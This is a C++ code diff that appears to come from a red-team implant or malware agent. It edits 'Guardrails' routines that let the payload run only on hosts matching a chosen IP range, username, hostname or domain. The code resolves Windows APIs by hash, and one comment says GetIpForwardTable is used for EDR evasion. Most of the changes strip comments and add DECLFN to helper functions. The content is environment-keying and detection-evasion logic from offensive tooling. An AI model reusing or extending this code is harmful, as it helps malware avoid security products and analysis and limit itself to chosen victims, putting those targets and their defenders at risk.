@@ -387,27 +387,25 @@ auto DECLFN Useful::CheckWorktime( VOID ) -> BOOL {
     }
 }
 
-// Helper: Parse IP string to ULONG (network byte order)
-static auto ParseIpAddress( CHAR* IpStr ) -> ULONG {
+static auto DECLFN ParseIpAddress( CHAR* IpStr ) -> ULONG {
     ULONG result = 0;
     INT32 octet = 0;
-    INT32 shift = 0;  // Start from 0, not 24 - we need network byte order
+    INT32 shift = 0;  
     
     for ( INT32 i = 0; IpStr[i] != '\0'; i++ ) {
         if ( IpStr[i] >= '0' && IpStr[i] <= '9' ) {
             octet = octet * 10 + ( IpStr[i] - '0' );
         } else if ( IpStr[i] == '.' ) {
             result |= ( octet << shift );
-            shift += 8;  // Increment, not decrement
+            shift += 8;
             octet = 0;
         }
     }
-    result |= ( octet << shift );  // Last octet
+    result |= ( octet << shift );  
     return result;
 }
 
-// Helper: Parse integer from string
-static auto ParseInt( CHAR* str, INT32* outVal ) -> INT32 {
+static auto DECLFN ParseInt( CHAR* str, INT32* outVal ) -> INT32 {
     INT32 val = 0;
     INT32 i = 0;
     
@@ -420,9 +418,7 @@ static auto ParseInt( CHAR* str, INT32* outVal ) -> INT32 {
     return i;
 }
 
-// Helper: Check if local IP matches guardrail pattern
-static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
-    // Check for CIDR notation (e.g., "192.168.1.0/24")
+static auto DECLFN IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
     INT32 slashPos = -1;
     for ( INT32 i = 0; guardPattern[i] != '\0'; i++ ) {
         if ( guardPattern[i] == '/' ) {
@@ -432,7 +428,6 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
     }
     
     if ( slashPos > 0 ) {
-        // CIDR notation
         CHAR baseIp[16] = { 0 };
         for ( INT32 i = 0; i < slashPos && i < 15; i++ ) {
             baseIp[i] = guardPattern[i];
@@ -442,9 +437,7 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
         ParseInt( guardPattern + slashPos + 1, &prefixLen );
         
         ULONG baseIpAddr = ParseIpAddress( baseIp );
-        
-        // Create mask for network byte order (first octet in low bits)
-        // For /24: we want bits 0-23 set = 0x00FFFFFF
+
         ULONG mask = 0;
         if ( prefixLen >= 32 ) {
             mask = 0xFFFFFFFF;
@@ -462,7 +455,6 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
         return match;
     }
     
-    // Check for range notation (e.g., "192.168.1.0-50")
     INT32 dashPos = -1;
     for ( INT32 i = 0; guardPattern[i] != '\0'; i++ ) {
         if ( guardPattern[i] == '-' ) {
@@ -472,7 +464,6 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
     }
     
     if ( dashPos > 0 ) {
-        // Range notation: "192.168.1.0-50"
         CHAR baseIp[16] = { 0 };
         for ( INT32 i = 0; i < dashPos && i < 15; i++ ) {
             baseIp[i] = guardPattern[i];
@@ -483,10 +474,8 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
         
         ULONG baseIpAddr = ParseIpAddress( baseIp );
         
-        // For network byte order (172.27.80.1 = 0x01501BAC):
-        // Last octet is in high bits, first 3 octets in low bits
-        ULONG baseLastOctet = ( baseIpAddr >> 24 ) & 0xFF;  // Get 4th octet
-        ULONG networkPrefix = baseIpAddr & 0x00FFFFFF;      // Get first 3 octets
+        ULONG baseLastOctet = ( baseIpAddr >> 24 ) & 0xFF; 
+        ULONG networkPrefix = baseIpAddr & 0x00FFFFFF;     
         
         ULONG localLastOctet = ( localIp >> 24 ) & 0xFF;
         ULONG localNetworkPrefix = localIp & 0x00FFFFFF;
@@ -503,7 +492,6 @@ static auto IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
         return FALSE;
     }
     
-    // Exact IP match
     ULONG guardIp = ParseIpAddress( guardPattern );
     
     UCHAR* localBytes = ( UCHAR* )&localIp;
@@ -545,35 +533,26 @@ auto DECLFN Guardrails( VOID ) -> BOOL {
         
         if ( mLoadLibraryA ) {
             mLoadLibraryA( "iphlpapi.dll" );
-            // mLoadLibraryA( "advapi32.dll" );
         }
-        // Use GetIpForwardTable for EDR evasion
         ULONG ( *mGetIpForwardTable )( PVOID, PULONG, BOOL ) = ( decltype( mGetIpForwardTable ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "iphlpapi.dll" ) ), Hsh::Str( "GetIpForwardTable" ) );
         
         if ( mGetIpForwardTable ) {
-            // Use fixed stack buffer (16KB should be enough for most routing tables)
             UCHAR StackBuffer[16384];
             ULONG dwSize = sizeof( StackBuffer );
             
-            // Call GetIpForwardTable with our stack buffer
             if ( mGetIpForwardTable( StackBuffer, &dwSize, FALSE ) == 0 ) {
-                // Extract local IPs from forward table
                 ULONG* pNumEntries = ( ULONG* )StackBuffer;
                 ULONG numEntries = *pNumEntries;
                 
-                // Each entry is after the count
                 UCHAR* pEntries = StackBuffer + sizeof( ULONG );
                 
-                // MIB_IPFORWARDROW structure offset for dwForwardNextHop (local IP)
-                // dwForwardDest(0) + dwForwardMask(4) + dwForwardPolicy(8) + dwForwardNextHop(12)
                 const INT32 NEXTHOP_OFFSET = 12;
-                const INT32 ROW_SIZE = 56; // sizeof(MIB_IPFORWARDROW)
+                const INT32 ROW_SIZE = 56; 
                 
                 for ( ULONG i = 0; i < numEntries && !IpMatch; i++ ) {
                     ULONG* pNextHop = ( ULONG* )( pEntries + ( i * ROW_SIZE ) + NEXTHOP_OFFSET );
                     ULONG localIp = *pNextHop;
                     
-                    // Skip 0.0.0.0
                     if ( localIp != 0 ) {
                         UCHAR* bytes = ( UCHAR* )&localIp;
                         
@@ -585,26 +564,22 @@ auto DECLFN Guardrails( VOID ) -> BOOL {
             }
         }
         
-        // If no IP match found, trigger guardrail (return TRUE to block execution)
         if ( ! IpMatch ) {
             return TRUE;
         }
     }
 
-    // Username
-    if ( UserFlag ) {
+	if ( UserFlag ) {
         CHAR  UserLocal[MAX_PATH] = { 0 };
         ULONG UserLocalSize       = sizeof( UserLocal );
         
         if ( mGetUserNameA && mGetUserNameA( UserLocal, &UserLocalSize ) ) {
-            // return FALSE;
             Str::ToLowerChar( UserLocal );
             Str::ToLowerChar( UserGuard );
 
             if ( Str::CompareA( UserLocal, UserGuard ) != 0 ) return TRUE;
         }
     }
-    // Hostname
     if ( HostFlag ) {
         CHAR  HostLocal[MAX_PATH] = { 0 };
         ULONG HostLocalSize = sizeof( HostLocal );
@@ -617,7 +592,6 @@ auto DECLFN Guardrails( VOID ) -> BOOL {
         }
     }
 
-    // Domain
     if ( DomainFlag ) {
         CHAR  DomainLocal[MAX_PATH] = { 0 };
         ULONG DomainLocalSize = sizeof( DomainLocal );
